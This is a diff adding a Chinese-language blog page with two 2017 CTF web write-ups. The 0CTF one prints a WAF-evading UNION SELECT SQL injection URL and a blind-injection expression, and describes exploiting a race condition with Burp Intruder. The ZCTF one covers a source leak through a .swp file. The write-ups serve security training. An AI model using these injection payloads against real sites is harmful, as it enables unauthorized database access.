+    <article id="post-0ctf2017-web-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/22/0ctf2017-web-writeup/" class="article-date">
+  <time datetime="2017-03-22T14:26:44.000Z" itemprop="datePublished">2017-03-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/03/22/0ctf2017-web-writeup/">0ctf2017-web-writeup</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="simplesqlin"><a href="#simplesqlin" class="headerlink" title="simplesqlin"></a>simplesqlin</h2><p><a href="http://202.120.7.203/index.php?id=1" target="_blank" rel="noopener">http://202.120.7.203/index.php?id=1</a> ，后面加上and 1=1 和and 1=2，返回结果不同，判断注入点在id，用order by 判断字段数为3，直接使用union select会被waf过滤，使用特殊字符截断关键字后能绕过waf。<br>playload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.120.7.203/index.php?id=-1%20un%0bion%20se%0blect%201,flag,3%20fro%0bm%20flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/0ctf2017-web-writeup/0ctf-1.png" alt=""></p>
+<h2 id="Temmo’s-Tiny-Shop"><a href="#Temmo’s-Tiny-Shop" class="headerlink" title="Temmo’s Tiny Shop"></a>Temmo’s Tiny Shop</h2><p>注册一个新账号，登陆后，infos中说如果你买东西就会有提示，但是钱只有4000，买不了8000的!HINT!，猜测要用条件竞争刷钱。于是把其它商品买了一遍，再看infos，其中有一条“Maybe you will know something when you know if the cat is alive”，商品名是Erwin Schrodinger’s Cat（薛定谔的猫）（这个梗…），猜想应该是这里存在竞争，于是用burpsuite的Intruder开多个线程对Erwin Schrodinger’s Cat进行买卖操作<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/0ctf2017-web-writeup/0ctf-2.png" alt=""><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/0ctf2017-web-writeup/0ctf-3.png" alt=""><br>把钱刷到了8800<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/0ctf2017-web-writeup/0ctf-4.png" alt=""><br>买了hint之后，得到提示select flag from ce63e444b0d049e9c899c9a0336b3c59<br>经过尝试，注入点应该在参数order，构造sql语句<br>if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),%s,1)like(0x5c%s),name,price)<br>可以绕过waf，盲注脚本打一发：</p>
+<p><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/0ctf2017-web-writeup/0ctf-5.png" alt=""><br>flag{r4ce_c0ndit0n_i5_excited}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://h34dw1nd.github.io/2017/03/22/0ctf2017-web-writeup/" data-id="cjbc9l1fx0000ukvk6thyzbku" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-ZCTF2017-web100-write-up" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/05/ZCTF2017-web100-write-up/" class="article-date">
+  <time datetime="2017-03-04T16:16:38.000Z" itemprop="datePublished">2017-03-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/03/05/ZCTF2017-web100-write-up/">ZCTF2017-web100 write up</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>首页只返回了一个 “蛤？”   （+1s?…）<br>手工试了几个url，发现有个1.php，里面是phpinfo，后来发现没什么价值。。<br>又发现存在.index.php.swp，有源码泄露<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/ZCTF2017-web100%20write%20up/zctf2017-web100-1.png" alt=""><br>写个脚本爆破一下<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/ZCTF2017-web100%20write%20up/zctf2017-web100-2.png" alt=""><br>得到zctf143431<br>传参过去，得到flag<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/ZCTF2017-web100%20write%20up/zctf2017-web100-3.png" alt=""></p>
+<p>PS. flappypig的dalao的writeup：<a href="http://bobao.360.cn/ctf/detail/186.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/detail/186.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://h34dw1nd.github.io/2017/03/05/ZCTF2017-web100-write-up/" data-id="cjbc9l1gs0008ukvk4eckusrq" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
@@ -132,6 +633,11 @@ expect:// — Process Interaction Streams
   
 
 
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">weiter &raquo;</a>
+  </nav>
+
 </section>
         
           <aside id="sidebar">
@@ -143,7 +649,7 @@ expect:// — Process Interaction Streams
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/瞎写/">瞎写</a></li></ul>
     </div>
   </div>
 
@@ -153,7 +659,7 @@ expect:// — Process Interaction Streams
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a>
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/漏洞分析/" style="font-size: 10px;">漏洞分析</a> <a href="/tags/瞎写/" style="font-size: 10px;">瞎写</a>
     </div>
   </div>
 
@@ -162,7 +668,7 @@ expect:// — Process Interaction Streams
   <div class="widget-wrap">
     <h3 class="widget-title">Archiv</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li></ul>
     </div>
   </div>
 
@@ -175,7 +681,23 @@ expect:// — Process Interaction Streams
       <ul>
         
           <li>
-            <a href="/2017/01/01/2016HCTF-writeup/">2016HCTF-writeup</a>
+            <a href="/2017/12/18/Windosw环境下安装Z3约束求解器并使用Python-Binding/">Windosw环境下安装Z3约束求解器并使用Python Binding</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/07/struts2-S2-052-复现及分析/">struts2 S2-052 复现及分析</a>
+          </li>
+        
+          <li>
+            <a href="/2017/07/16/CTFd-Flask-使用flask-migrate迁移数据库/">CTFd--Flask--使用flask-migrate迁移数据库</a>
+          </li>
+        
+          <li>
+            <a href="/2017/07/16/CTFd-发邮件的坑/">CTFd--发邮件的坑</a>
+          </li>
+        
+          <li>
+            <a href="/2017/07/12/第十届全国大学生信息安全竞赛-部分web-writeup/">第十届全国大学生信息安全竞赛 部分web-writeup</a>
           </li>
         
       </ul>
